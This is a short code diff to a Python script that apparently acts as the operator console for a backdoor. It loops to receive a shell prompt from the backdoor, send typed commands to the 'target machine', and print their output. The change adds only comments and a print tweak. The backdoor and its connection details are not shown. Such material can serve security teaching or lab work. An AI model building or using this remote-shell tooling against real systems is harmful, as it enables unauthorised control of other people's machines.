@@ -19,12 +19,15 @@ def main():
 
             # simulate remote shell
             while True:
+                # wait for the backdoor to send the shell prompt
                 prompt = client_socket.receive()
-                print(prompt)
+                print(prompt, end=' ')
 
+                # get user command and send to target machine
                 user_input = input()
                 client_socket.send(user_input)
 
+                # wait for backdoor to send command output
                 command_output = client_socket.receive()
                 print(command_output)
 
